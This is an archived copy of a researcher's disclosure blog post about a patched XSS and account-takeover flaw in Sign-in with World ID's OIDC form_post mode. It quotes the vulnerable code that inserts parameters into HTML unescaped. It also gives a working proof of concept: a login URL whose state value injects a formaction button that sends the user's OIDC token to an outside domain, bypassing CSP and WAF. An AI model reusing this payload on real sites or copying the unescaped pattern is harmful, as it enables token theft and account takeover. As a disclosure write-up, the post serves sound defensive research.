---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-06-19_sign-in-with-world-id-xss-and-ato-via-oidc-form-post-response-mode.md
original_filename: 2024-06-19_sign-in-with-world-id-xss-and-ato-via-oidc-form-post-response-mode.md
title: 'Sign-in with World ID: XSS and ATO via OIDC Form Post Response Mode'
category: blogs
detected_topics:
- oauth
- xss
- sso
- access-control
- command-injection
- otp
tags:
- imported
- blogs
- oauth
- xss
- sso
- access-control
- command-injection
- otp
language: en
raw_sha256: 2d37a47bcc0419116196a5108183fbe13fd5da7d842152974a1a592ce7a17dbe
text_sha256: 7066fdaf755f035295de024c46d2746519cfba890edc0f91fca7c1896f9eea0a
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: false
---

# Sign-in with World ID: XSS and ATO via OIDC Form Post Response Mode

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-06-19_sign-in-with-world-id-xss-and-ato-via-oidc-form-post-response-mode.md
- Source Type: markdown
- Detected Topics: oauth, xss, sso, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: False
- Raw SHA256: `2d37a47bcc0419116196a5108183fbe13fd5da7d842152974a1a592ce7a17dbe`
- Text SHA256: `7066fdaf755f035295de024c46d2746519cfba890edc0f91fca7c1896f9eea0a`


## Content

---
title: "Sign-in with World ID: XSS and ATO via OIDC Form Post Response Mode"
page_title: "(Web-)Insecurity Blog | Sign-in with World ID: XSS and ATO via OIDC Form Post Response Mode"
url: "https://security.lauritz-holtmann.de/advisories/tfh-form_post-xss-ato/"
final_url: "https://security.lauritz-holtmann.de/advisories/tfh-form_post-xss-ato/"
authors: ["Lauritz Holtmann (@_lauritz_)"]
programs: ["Tools for Humanity (Worldcoin)"]
bugs: ["OIDC", "XSS", "Account takeover", "CSP bypass", "WAF bypass"]
publication_date: "2024-06-19"
added_date: "2024-07-08"
source: "pentester.land/writeups.json"
original_index: 241
---

ADVISORIES June 19, 2024 4 min read 691 words

Recently, [Tools for Humanity](https://www.toolsforhumanity.com/) partnered with the [German HackerOne Club](https://h1.community/germany-hackerone-club/) to run a one-week virtual and in-person [_Hacking Meetup_](https://h1.community/events/details/hackerone-germany-hackerone-club-presents-hackerone-hacking-meetup-tools-for-humanity-x-hackerone-club-germany/). In the course of the meetup, a critical vulnerability within the [Sign-in with World ID](https://docs.worldcoin.org/sign-in) implementation was found, which affected the _OpenID Connect_ `form_post` Response Mode and could allow malicious actors to take over end-user accounts at third-party applications that utilize the _Sign-in with World ID_ mechanism. The vulnerability [was addressed](https://github.com/worldcoin/world-id-sign-in/commit/3c147bd3cfe4361d7b535f0bbad9f429672b2474) within a few hours after triage.

* * *

_Tools for Humanity_ ’s [Sign-in with World ID](https://docs.worldcoin.org/sign-in) implements the OpenID Connect protocol. It supports multiple response modes such as `query`, `fragment`, and `form_post`:

> **response_mode**
> 
> Determines how the authorization code, ID token, and/or access token are returned. Must be one of `query`, `fragment`, or `form_post`. `query` is only supported for the authorization code flow. Defaults to `query` for authorization code flow, and `fragment` for all others.

The `response_mode=form_post` did not sufficiently encode and/or filter the `state` parameter, resulting in _Cross-Site Scripting_ (XSS), which was blocked by the _Content Security Policy_ (CSP). By injecting HTML without JavaScript, it was still possible to circumvent the CSP and directly disclose end-user `token` values of arbitrary applications to an attacker-controlled destination.

This is how the XSS “ _sink_ ” looked like from the user agent’s perspective:
  
  
  <!DOCTYPE html>  
  <html>  
  [...] 
  </head>  
  <body onload="submitForm()">  
  <form id="formRedirect" method="post" action="https://docs.worldcoin.org/try-callback">  
  <input type="hidden" name="token" value="eyJhbGciOiJS[...]" />,<input type="hidden" name="state" value="PAYLOAD" />  
  <[...]
  </form>  
  </body>  
  </html>
  

The sink was discovered via a black box approach, it was trivially possible to escape the _value_ attribute. This was caused by [the following code snippet](https://github.com/worldcoin/world-id-sign-in/blob/5bbedb71c76630104be3ba949b8830a14c2b7581/src/app/authenticate/route.ts#L64-L68):
  
  
  [...]
  } else if (parsedParams.response_mode === OIDCResponseMode.FormPost) {
  const formHtml = `  
  <!DOCTYPE html>  
  <html>  
  <head>  
  <script>  
  function submitForm() {  
  document.getElementById("formRedirect").submit();  
  }  
  </script>  
  </head>  
  <body onload="submitForm()">  
  <form id="formRedirect" method="post" action="${url}">  
  ${Array.from(result.url_params.entries()).map(
  ([key, value]) =>
  `<input type="hidden" name="${key}" value="${value}" />`
  )}  
  <noscript>  
  <button type="submit">Submit</button>  
  </noscript>  
  </form>  
  </body>  
  </html>
  `;
  
  return new NextResponse(formHtml, {
  headers: { "Content-Type": "text/html; charset=utf-8" },
  });
  }
  [...]
  

### Exploitation: Bypassing WAF and CSP

The affected endpoint has a quite strict CSP in place _and_ was additionally protected using a _Web Application Firewall_ (WAF).

Thus, straightforward XSS payloads did not work to disclose the sensitive `code` (in `authorization_code` response type) or `id_token`/`access_token` (in `token` or `id_token` response type).

This limitation could be bypassed by hijacking the HTML form that was already in place for the `form_post` response mode, by injecting a button with a [`formaction`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/button?retiredLocale=de#formaction) attribute that overwrites the legitimate action of the HTML form:

> **formaction**
> 
> The URL that processes the information submitted by the button. Overrides the action attribute of the button’s form owner. Does nothing if there is no form owner.

(<https://developer.mozilla.org/en-US/docs/Web/HTML/Element/button?retiredLocale=de#formaction>)

This lets us build the following attack chain.

  1. As a victim user, browse `https://id.worldcoin.org/login?client_id=app_8ad4dd04557f8b768243904bf76d8db0&response_type=token&redirect_uri=https://lhq.at&scope=openid&state="><input+type=submit+value=Click!+formaction=//lauritz-holtmann.de>&nonce=test6&ready=test&response_mode=form_post`

  2. Scan the QR code and confirm flow via the [World App](https://worldcoin.org/download-app).

  3. Within the browser session (see step 1.) there is a redirect to the following HTML form:

  
  
  HTTP/2 200 OK
  Date: Wed, 22 May 2024 14:35:21 GMT
  Content-Type: text/html; charset=utf-8
  Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-be795666-8d17-4054-bb9a-1309578933a5' 'strict-dynamic'; font-src 'self' https://world-id-assets.com; style-src 'self' 'unsafe-inline' fonts.googleapis.com; connect-src 'self' https://app.posthog.com https://docs.worldcoin.org https://status.worldcoin.org https://bridge.worldcoin.org https://developer.worldcoin.org; img-src 'self' https://worldcoin.org https://world-id-assets.com
  Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url
  
  <!DOCTYPE html>  
  <html>  
  <head>  
  <script>  
  function submitForm() {  
  document.getElementById("formRedirect").submit();  
  }  
  </script>  
  </head>  
  <body onload="submitForm()">  
  <form id="formRedirect" method="post" action="https://docs.worldcoin.org/try-callback">  
  <input type="hidden" name="token" value="eyJhbGciOiJS[...]" />,
  <input type="hidden" name="state" value=""><input type=submit value=Click! formaction=//lauritz-holtmann.de>" />  
  <noscript>  
  <button type="submit">Submit</button>  
  </noscript>  
  </form>  
  </body>  
  </html>
  

  4. Click the injected button:  
![XSS PoC: Injected Button](/images/advisories/tfh-xss1.png)

  5. Observe the POST request to my domain including the end-user’s `token`:  
![XSS PoC: Disclosed Token](/images/advisories/tfh-xss2.png)

### Impact

The described vulnerability potentially allowed malicious actors to obtain sensitive OIDC tokens that allow them to take over end-user accounts at relying parties that use the “Sign-in with World ID” mechanism.

* * *

Thank you for reading this post! If you have any feedback, feel free to reach out via [Mastodon](https://ruhr.social/@lauritz), [Twitter](https://twitter.com/_lauritz_), or [LinkedIn](https://linkedin.com/in/lauritz-holtmann). 👨‍💻

I would like to especially thank [Ian](https://www.linkedin.com/in/ianklatzco/) and [Juan](https://www.linkedin.com/in/juan-broullon/), and [Austin](https://www.linkedin.com/in/austinmdunn/) of _Tools for Humanity_ for their continuous support throughout and after the meetup!

If you are interested in current research about SSO protocols, my recent post “ _[POST to XSS: Leveraging Pseudo Protocols to Gain JavaScript Evaluation in SSO Flows](/post/sso-security-redirect-uri-iii/)_ ”, which sheds light on an under-researched area of protocol-level XSS issues, may be of interest for you. 🙂

  * [OpenID Connect](/tags/openid-connect)
  * [Tools For Humanity](/tags/tools-for-humanity)
